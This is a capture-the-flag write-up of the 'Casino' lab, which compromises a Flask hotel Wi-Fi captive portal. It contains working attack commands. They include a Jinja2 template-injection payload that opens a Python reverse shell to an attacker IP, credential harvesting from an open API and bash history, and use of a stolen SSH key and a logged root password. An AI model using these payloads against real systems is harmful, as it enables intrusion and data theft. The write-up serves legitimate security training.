# Casino - HackSmarterLab Writeup

**Difficulty:** Medium
**Target:** 10.1.141.8
**Objective:** WiFi Captive Portal pentest — user flag and root flag

---

## Recon

### Port Scan

```bash
nmap -sV -sC 10.1.141.8
```

Results:

- Port 22 — OpenSSH 9.6p1 Ubuntu (host)
- Port 80 — Werkzeug/3.1.8 Python/3.10.18 (Flask app)
- Port 2222 — OpenSSH 8.4p1 Debian (Docker container)

The web server immediately redirects to `/login`. Two SSH ports suggest Docker is running on the host.

### Web Enumeration

```bash
gobuster dir -u http://10.1.141.8 -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:

- `/login` — 200 OK, captive portal login form
- `/dashboard` — 302 redirect to /login
- `/profile` — 302 redirect to /login
- `/logout` — 302 redirect to /login

The login page accepts `room_number` (numeric, 101-599) and `last_name` as POST parameters.

---

## Information Disclosure via Source Map

Checking the JavaScript file revealed a source map reference:

```bash
curl http://10.1.141.8/static/js/app.min.js
# Output includes: //# sourceMappingURL=app.min.js.map
```

Fetching the source map:

```bash
curl http://10.1.141.8/static/js/app.min.js.map
```

The source map exposed original source code containing an internal API endpoint:

```
/api/v1/rooms/status?status=occupied
```

This was labeled a "Front-Desk Kiosk API verification helper" — meaning it was never intended to be public-facing.

---

## Unauthenticated API Access

```bash
curl http://10.1.141.8/api/v1/rooms/status?status=occupied
```

The endpoint returned all 100 occupied guest records with no authentication required:

```json
{
  "rooms": [
    {"room_number": 105, "guest_name": "Smith", ...},
    {"room_number": 108, "guest_name": "Williams", ...}
  ]
}
```

This gave valid room number and last name pairs to log into the captive portal.

---

## Gaining Portal Access

Using a credential pair from the API:

```bash
curl -s -X POST http://10.1.141.8/login \
  -d "room_number=108&last_name=Williams" \
  -c cookies.txt -D - | head -5
```

Response: `302 FOUND` with redirect to `/dashboard` — login successful.

---

## Server-Side Template Injection (SSTI)

The `/profile` page contained a form with a `display_name` field. Reviewing the Flask source code later confirmed the vulnerability:

```python
dynamic_template = f"""
...Welcome Back, {display_name}!...
"""
return render_template_string(dynamic_template)
```

The user-controlled `display_name` was inserted directly into an f-string before being passed to `render_template_string()`, bypassing Jinja2's auto-escaping.

**Detection:**

```bash
curl -s -X POST http://10.1.141.8/profile \
  -b cookies.txt -c cookies.txt \
  -d "display_name={{7*7}}"

curl -s http://10.1.141.8/dashboard -b cookies.txt | grep "Welcome Back"
```

Response: `Welcome Back, 49!` — Jinja2 evaluated the expression, confirming SSTI.

---

## Remote Code Execution

**Start a listener on your attack machine:**

```bash
nc -lvnp 9999
```

**Send the reverse shell payload:**

```bash
curl -s -X POST http://10.1.141.8/profile \
  -b cookies.txt -c cookies.txt \
  --data-urlencode 'display_name={{config.__class__.__init__.__globals__["os"].popen("python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\"10.200.119.30\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\"").read()}}'
```

**Trigger execution:**

```bash
curl -s http://10.1.141.8/dashboard -b cookies.txt > /dev/null
```

Shell received as `www-data` inside a Docker container (`hostname: 2d162aa4c38a`, `/.dockerenv` present).

---

## User Flag

Enumerating home directories:

```bash
ls /home/
# george  david

ls /home/george/
# user.txt  .ssh  .bash_history

cat /home/george/user.txt
```

**User flag: `HSM{g30rg3_n33ds_b3tt3r_ssh_k3y_p3****`**

---

## Lateral Movement — George's SSH Key

The flag name hinted at SSH key permission issues. Checking:

```bash
ls -la /home/george/.ssh/
# -rw-r--r-- george george id_rsa      (world-readable!)
# -rw-r--r-- george george authorized_keys

cat /home/george/.ssh/id_rsa
```

The private key had `644` permissions, making it readable by any user. Using it from the attack machine:

```bash
chmod 600 /tmp/george_id_rsa
ssh -i /tmp/george_id_rsa george@10.1.141.8 -p 2222
```

Logged in as `george` on the container via port 2222.

---

## Credential Leak in Bash History

George's `.bash_history` was world-readable:

```bash
cat /home/george/.bash_history
```

The history contained:

```
su david
DavidPass2026!#
mysql -u david -p'DavidPass2026!#' -h 127.0.0.1 resort_db
```

David's password was stored in plaintext after a failed attempt to clear history.

Switching to david:

```bash
su david
# password: DavidPass2026!#
```

---

## Root Credential in Provisioning Log

David was a member of the `adm` group, which grants read access to system logs:

```bash
cat /etc/group | grep david
# adm:x:4:david

ls /var/log/
# provisioning.log  supervisord.log  ...

cat /var/log/provisioning.log
```

Output contained:

```
2026-08-01 03:14:31 [DEBUG] Saved system root sync credential: R3s0rt_Sup3r_S3cr3t_R00t_2026!
```

A debug line logged the root password in plaintext during automated provisioning.

---

## Root Access

```bash
su root
# password: R3s0rt_Sup3r_S3cr3t_R00t_2026!

cat /root/root.txt
```

**Root flag: `HSM{r3s0rt_w1f1_c0mpete_syst3m_pwn****`**